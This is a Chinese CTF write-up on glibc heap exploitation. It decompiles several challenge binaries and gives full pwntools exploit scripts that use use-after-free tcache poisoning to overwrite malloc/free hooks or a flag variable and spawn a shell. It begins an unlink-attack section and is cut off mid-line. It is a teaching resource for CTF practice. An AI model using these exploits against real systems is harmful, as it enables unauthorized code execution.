<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">27899</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;size is :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;name is :&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">backdoor  = <span class="number">0x400b9c</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaaaa&#x27;</span>) <span class="comment">#idx 0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;cccccc&#x27;</span>) <span class="comment">#idx 1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(backdoor))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这道题关键是要弄清楚各个堆块内存的管理。也是UAF的手法。</p>
<h4 id="HGAME-2023-week2-editable-note"><a href="#HGAME-2023-week2-editable-note" class="headerlink" title="[HGAME 2023 week2]editable_note"></a><code>[HGAME 2023 week2]editable_note</code></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>版本是2.31的。此时__malloc_hook和free_hook还没有被移除（2.34）。所以我们可以通过改malloc_hook为one_gadget或者改free_hook为system来getshell。</p>
<p>这里的漏洞点在于delete_note()函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n0xF; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;n0xF);</span><br><span class="line">  <span class="keyword">if</span> ( n0xF &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[n0xF] )</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)notes[n0xF]);                <span class="comment">// uaf</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看出存在uaf可以供我们利用。那我们就可以正常改fd了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node5.anna.nssctf.cn&#x27;,26005)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) -<span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">one_gadget = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">malloc_hook = base + libc.sym.__malloc_hook</span><br><span class="line">free_hook = base + libc.sym.__free_hook</span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add(9,0x20)</span></span><br><span class="line"><span class="string">add(10,0x20)</span></span><br><span class="line"><span class="string">free(8)</span></span><br><span class="line"><span class="string">free(9)</span></span><br><span class="line"><span class="string">edit(10,b&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line"><span class="string">edit(9,p64(free_hook))</span></span><br><span class="line"><span class="string">add(11,0x20) </span></span><br><span class="line"><span class="string">add(12,0x20)</span></span><br><span class="line"><span class="string">edit(12,p64(sys))</span></span><br><span class="line"><span class="string">free(10)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">9</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">11</span>,p64(base+one_gadget[<span class="number">1</span>]))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x20</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里两种方法都能跑通。选一种就行。</p>
<p>由于tcache bins的存在。所以我们需要先填满tcache bins然后来申请到unsorted bin管理的堆块来泄露libc的基地址。</p>
<p>这里还有一个考点，就是为什么我要把8也free掉呢？这是因为tcache bins管理chunk的时候是靠count来的。也就是说，如果我们不free掉8，只free9的话，那么count&#x3D;1。由于我需要多申请一个chunk来先把我们free掉的9的堆块从tcache bins中脱除。那么此时count&#x3D;0。当我们再次申请的时候，理论上就能申请到我们修改的fd的地址，也就是malloc_hook或者free_hook了。但是此时由于count&#x3D;0。所以tcache bins默认它管理的链表已经为空。也就是说我们申请不出来了。系统只会去找其他bins来找到符合我们大小要求的chunk。那么我们再怎么操作也改写不了hook函数了。</p>
<p>所以我们free两次后，count&#x3D;2此时申请的11堆块就是我们的hook函数了。真是有趣。</p>
<h4 id="LitCTF-2024-heap-2-27"><a href="#LitCTF-2024-heap-2-27" class="headerlink" title="[LitCTF 2024]heap-2.27"></a><code>[LitCTF 2024]heap-2.27</code></h4><p>这道题和上面Hgame的大题思路基本一致。也是存在uaf供我们利用然后改写hook函数。这里就不过多赘述了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,27788)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;? &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;? &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;? &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;? &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;? &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) -<span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">malloc_hook = base + libc.sym.__malloc_hook</span><br><span class="line">free_hook = base + libc.sym.__free_hook</span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line">one_gadget = [<span class="number">0x4f29e</span>,<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">edit(9,p64(malloc_hook))</span></span><br><span class="line"><span class="string">add(10,0x20)</span></span><br><span class="line"><span class="string">add(11,0x20)</span></span><br><span class="line"><span class="string">edit(11,p64(base+one_gadget[3]))</span></span><br><span class="line"><span class="string">add(12,0x20)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(<span class="number">9</span>,p64(free_hook))</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">12</span>,p64(sys))</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里也是两种方法都能跑通。</p>
<h4 id="WUSTCTF-2020-easyfast"><a href="#WUSTCTF-2020-easyfast" class="headerlink" title="[WUSTCTF 2020]easyfast"></a><code>[WUSTCTF 2020]easyfast</code></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  *(_QWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v1 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;choice&gt;&quot;</span>);</span><br><span class="line">    fgets(s, <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(s) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add(s, <span class="number">8LL</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete(s, <span class="number">8LL</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit(s, <span class="number">8LL</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        backdoor(s, <span class="number">8LL</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invalid&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的漏洞很简单。就是uaf的手法。更简单的是这里有backdoor。里面就直接给了我们&#x2F;bin&#x2F;sh。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( qword_602090 )                           <span class="comment">// 改1为0</span></span><br><span class="line">                                                <span class="comment">// 0x602090</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Not yet&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看一下执行条件。也就是只要把qword_602090里的值改为0就可以了。</p>
<p>我们在ida里仔细观察。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:0000000000602088                 db  50h ; P</span><br><span class="line">.data:0000000000602089                 db    0</span><br><span class="line">.data:000000000060208A                 db    0</span><br><span class="line">.data:000000000060208B                 db    0</span><br><span class="line">.data:000000000060208C                 db    0</span><br><span class="line">.data:000000000060208D                 db    0</span><br><span class="line">.data:000000000060208E                 db    0</span><br><span class="line">.data:000000000060208F                 db    0</span><br><span class="line">.data:0000000000602090 qword_602090    dq 1</span><br></pre></td></tr></table></figure>

<p>在0x602088的时候刚刚好有50的大小可以作为我们的size位。所以我们要通过uaf申请到0x602080，作为我们fake_chunk的header。这样0x602090刚刚好是我们的user_data。只要把1改成0就大功告成了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node5.anna.nssctf.cn&#x27;,26793)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x602080</span>))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment">#3</span></span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn进阶</tag>
      </tags>
  </entry>
  <entry>
    <title>Unlink_attack</title>
    <url>/2026/02/19/Unlink-attack/</url>
    <content><![CDATA[<h2 id="Unlink-attack"><a href="#Unlink-attack" class="headerlink" title="Unlink attack"></a><code>Unlink attack</code></h2><p>unlink，俗称拖链，将<code>unsorted_bin</code>中的处于free状态的堆块脱离出来，然后和物理地址相邻的新free的堆块合并成大堆块（可以是向前合并或者向后合并），合并完之后再放入<code>unsorted_bin</code>中。</p>
<p>一般产生漏洞的原因是通过off-by-null，off-by-one，堆溢出，修改了堆块的p标志位。</p>
<h3 id="SUCTF-2018-招新赛-unlink"><a href="#SUCTF-2018-招新赛-unlink" class="headerlink" title="[SUCTF 2018 招新赛]unlink"></a><code>[SUCTF 2018 招新赛]unlink</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to note system&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please chooice :&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        touch();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        take_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        exit_0();</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;no such option&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是菜单形式的程序。</p>
<p>下面的是touch函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">touch</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">10</span> &amp;&amp; (&amp;buf)[i]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;the node is full&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input the size : &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt;= <span class="number">0</span> &amp;&amp; size &lt;= <span class="number">512</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">    (&amp;buf)[i] = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="keyword">if</span> ( (&amp;buf)[i] )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;touch successfully&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，这里我们能建立不超过10个的堆块。我们的size被限定在了0~0x200的字节大小。同时buf这个数组存放了我们申请的堆块的首地址。</p>
<p>下面是take_note函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">take_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n9; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;which one do you want modify :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;buf)[n9] != <span class="number">0LL</span> &amp;&amp; n9 &gt;= <span class="number">0</span> &amp;&amp; n9 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please input the content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, (&amp;buf)[n9], <span class="number">0x100u</span>LL);              <span class="comment">// 堆溢出</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span 